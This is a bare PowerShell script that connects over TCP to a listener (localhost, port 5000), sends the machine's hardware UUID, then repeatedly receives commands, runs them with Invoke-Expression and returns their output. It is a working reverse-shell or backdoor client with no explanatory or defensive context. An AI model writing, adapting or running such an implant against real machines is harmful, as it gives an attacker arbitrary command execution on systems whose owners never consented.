# Attempt to establish connection to server.
$client = New-Object System.Net.Sockets.TCPClient "localhost", 5000;
if ($client -eq $null) {
    exit 1;
}

# Initialize byte stream.
$stream = $client.GetStream();

# Get unique identifier for the machine.
try {
    $uuid = (Get-WMIObject Win32_ComputerSystemProduct).UUID;
} catch [System.Management.Automation.CommandNotFoundException] {
    $uuid = 0xFF;
}

# Send UUID to server.
$stream.Write($uuid, 0, $uuid.Length);
$stream.Flush();

# Pre-initialize byte array with zeroes?. Max command length 65535 bytes?
[byte[]] $bytes = 0..65535 |% {0};

# Loop indefinitely until "exit" command is issued.
while (1) {

    # Read bytes from stream and encode to ASCII.
    $i = $stream.Read($bytes, 0, $bytes.Length);
    $cmd = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);

    # If no bytes were read, try again.
    if ($cmd -eq "") {
        continue;
    } elseif ($cmd -eq "exit") {
        break;
    }

    # Run command, encode stdout as UTF-8.
    $out = [System.Text.Encoding]::UTF8.GetBytes((iex $cmd 2>&1 | Out-String));

    # Write output to stream.
    $stream.Write($out, 0, $out.Length);
    $stream.Flush();
}

$client.Close();
